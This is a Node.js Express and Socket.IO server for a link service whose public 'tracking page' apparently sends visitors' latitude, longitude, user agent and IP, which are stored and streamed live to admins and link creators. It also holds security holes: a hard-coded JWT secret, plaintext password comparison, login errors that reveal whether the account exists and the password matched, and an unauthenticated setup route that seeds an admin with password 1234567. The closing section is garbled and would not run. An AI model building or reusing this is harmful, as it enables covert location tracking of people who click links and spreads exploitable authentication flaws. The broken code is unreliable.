const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const path = require('path');
const cookieParser = require('cookie-parser');
const { sequelize, User, Link, Session } = require('./models');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: '*', // Allow all for dev, restrict in prod
        methods: ['GET', 'POST']
    }
});

const PORT = 3001;
const SECRET_KEY = 'super-secret-key-change-in-prod';

// Middleware
app.use(cors());
app.use(express.json());
app.use(cookieParser());

// Auth Middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (token == null) return res.sendStatus(401);

    jwt.verify(token, SECRET_KEY, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

// --- ROUTES ---

// Simple Ping (No DB)
app.get('/api/ping', (req, res) => {
    res.json({ message: 'pong', timestamp: new Date().toISOString() });
});

// Login
app.post('/api/login', async (req, res) => {
    console.log('Login request:', req.body);
    const { email, password } = req.body;

    try {
        const user = await User.findOne({ where: { email } });

        if (user && user.password === password) { // In prod, use bcrypt!
            if (!user.isActive) {
                return res.status(403).json({ message: 'Cuenta desactivada' });
            }
            const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, SECRET_KEY, { expiresIn: '24h' });
            res.json({ token, role: user.role });
        } else {
            console.log('Login failed for:', email);
            console.log('User found:', !!user);
            if (user) console.log('Pass match:', user.password === password);

            // DEBUG RESPONSE FOR USER
            res.status(401).json({
                message: `Credenciales inválidas (Debug: User=${!!user}, PassMatch=${user ? (user.password === password) : 'N/A'})`
            });
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Error interno del servidor: ' + error.message });
    }
});

// Create Link
app.post('/api/links', authenticateToken, async (req, res) => {
    const { title, description, imageUrl, destinationUrl } = req.body;

    try {
        const newLink = await Link.create({
            id: Math.random().toString(36).substr(2, 9), // Keep short ID for URLs
            title,
            description,
            imageUrl,
            destinationUrl,
            createdBy: req.user.id
        });
        res.json(newLink);
    } catch (error) {
        console.error('Create link error:', error);
        res.status(500).json({ message: 'Error creando enlace' });
    }
});

// Get Link Public Info (for the tracking page)
app.get('/api/links/:id', async (req, res) => {
    try {
        const link = await Link.findByPk(req.params.id);
        if (link) {
            res.json({
                title: link.title,
                description: link.description,
                imageUrl: link.imageUrl,
                destinationUrl: link.destinationUrl
            });
        } else {
            res.status(404).json({ message: 'Enlace no encontrado' });
        }
    } catch (error) {
        res.status(500).json({ message: 'Error recuperando enlace' });
    }
});

// Get All Links (Admin only)
app.get('/api/admin/links', authenticateToken, async (req, res) => {
    if (req.user.role !== 'admin') return res.sendStatus(403);
    try {
        const links = await Link.findAll({ include: User });
        res.json(links);
    } catch (error) {
        res.status(500).json({ message: 'Error fetching links' });
    }
});

// Get Active Sessions (Admin only)
app.get('/api/admin/sessions', authenticateToken, async (req, res) => {
    if (req.user.role !== 'admin') return res.sendStatus(403);
    try {
        // Retrieve recent sessions (last 24h?) or all? For now all.
        const sessions = await Session.findAll({
            include: Link,
            order: [['timestamp', 'DESC']],
            limit: 100
        });
        res.json(sessions);
    } catch (error) {
        res.status(500).json({ message: 'Error fetching sessions' });
    }
});

// --- USER DASHBOARD ROUTES ---

// Get User's Links
app.get('/api/user/links', authenticateToken, async (req, res) => {
    try {
        const links = await Link.findAll({ where: { createdBy: req.user.id } });
        res.json(links);
    } catch (error) {
        res.status(500).json({ message: 'Error fetching user links' });
    }
});

// Get User's Sessions (Locations for their links)
app.get('/api/user/sessions', authenticateToken, async (req, res) => {
    try {
        const userLinks = await Link.findAll({
            where: { createdBy: req.user.id },
            attributes: ['id']
        });
        const linkIds = userLinks.map(l => l.id);

        const sessions = await Session.findAll({
            where: { linkId: linkIds },
            order: [['timestamp', 'DESC']],
            limit: 100
        });
        res.json(sessions);
    } catch (error) {
        res.status(500).json({ message: 'Error fetching user sessions' });
    }
});

// Get User's Stats
app.get('/api/user/stats', authenticateToken, async (req, res) => {
    try {
        const totalLinks = await Link.count({ where: { createdBy: req.user.id } });

        // Count total sessions for user's links
        // A bit complex query, but let's do 2 steps
        const userLinks = await Link.findAll({
            where: { createdBy: req.user.id },
            attributes: ['id']
        });
        const linkIds = userLinks.map(l => l.id);
        const totalLocations = await Session.count({ where: { linkId: linkIds } });

        res.json({
            totalLinks,
            totalLocations
        });
    } catch (error) {
        res.status(500).json({ message: 'Error fetching stats' });
    }
});

// --- ADMIN USER MANAGEMENT ROUTES ---

app.post('/api/admin/users', authenticateToken, async (req, res) => {
    if (req.user.role !== 'admin') return res.sendStatus(403);
    try {
        const { email, password, role } = req.body;
        const newUser = await User.create({ email, password, role });
        res.json(newUser);
    } catch (error) {
        res.status(500).json({ message: 'Error creating user' });
    }
});

app.get('/api/admin/users', authenticateToken, async (req, res) => {
    if (req.user.role !== 'admin') return res.sendStatus(403);
    try {
        const users = await User.findAll({ attributes: { exclude: ['password'] } });
        res.json(users);
    } catch (error) {
        res.status(500).json({ message: 'Error fetching users' });
    }
});

app.put('/api/admin/users/:id/toggle', authenticateToken, async (req, res) => {
    if (req.user.role !== 'admin') return res.sendStatus(403);
    try {
        const user = await User.findByPk(req.params.id);
        if (!user) return res.status(404).json({ message: 'User not found' });

        user.isActive = !user.isActive;
        await user.save();
        res.json(user);
    } catch (error) {
        res.status(500).json({ message: 'Error updating user' });
    }
});


// --- SOCKET.IO ---

io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    // Admin joins 'admin-room'
    socket.on('join-admin', () => {
        socket.join('admin-room');
    });

    // Client sends location
    socket.on('update-location', async ({ linkId, lat, lng, userAgent }) => {
        try {
            const sessionsData = {
                socketId: socket.id,
                linkId,
                lat,
                lng,
                userAgent,
                ip: socket.handshake.address
            };

            // Save to DB
            const createdSession = await Session.create(sessionsData);

            // Broadcast to admins
            io.to('admin-room').emit('location-updated', createdSession);
        } catch (error) {
            console.error('Error saving session:', error);
        }
    });

    socket.on('disconnect', async () => {
        // Technically sessions are logs, so we don't "remove" them on disconnect usually, 
        // but for "Active Users" map we might want to know.
        // We will just notify admin.
        io.to('admin-room').emit('client-disconnected', socket.id);
    });
});

// --- SYSTEM ROUTES ---

app.get('/api/health', async (req, res) => {
    try {
        await sequelize.authenticate();
        res.json({
            status: 'online',
            database: 'connected',
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Health check failed:', error);
        res.status(500).json({
            status: 'error',
            database: 'disconnected',
            error: error.message
        });
    }
});

// --- SETUP/MIGRATION ROUTE ---
app.get('/api/setup-db', async (req, res) => {
    try {
        await sequelize.sync({ alter: true });
        console.log('Database synced via endpoint');

        const createdUsers = [];

        // Seed Admin
        const adminEmail = 'admin@admin';
        let admin = await User.findOne({ where: { email: adminEmail } });
        if (!admin) {
            admin = await User.create({
                email: adminEmail,
                password: '1234567',
                role: 'admin'
            });
            createdUsers.push('Admin created');
        } else {
            createdUsers.push('Admin exists');
        }

        // Seed User
        const userEmail = 'user@user.com';
        let userUser = await User.findOne({ where: { email: userEmail } });
        if (!userUser) {
            userUser = await User.create({
                email: userEmail,
                password: '1234567',
                role: 'user'
            });
            createdUsers.push('User created');
        } else {
            createdUsers.push('User exists');
        }

        res.json({ message: 'Database setup complete', details: createdUsers });
    } catch (error) {
        console.error('Setup failed:', error);
        res.status(500).json({ message: 'Setup failed', error: error.message });
    }
});

// Initialize DB and Server
await User.create({
    email: adminEmail,
    password: '1234567',
    role: 'admin'
});
console.log('Admin user created');
    }

// Seed Standard User if not exists
const userEmail = 'user@user.com';
const userUser = await User.findOne({ where: { email: userEmail } });
if (!userUser) {
    await User.create({
        email: userEmail,
        password: '1234567',
        role: 'user'
    });
    console.log('Standard user created');
}

if (require.main === module) {
    server.listen(PORT, () => {
        console.log(`Server running on http://localhost:${PORT}`);
    });
}
}).catch (err => {
    console.error('Unable to connect to the database:', err);
});

module.exports = app;
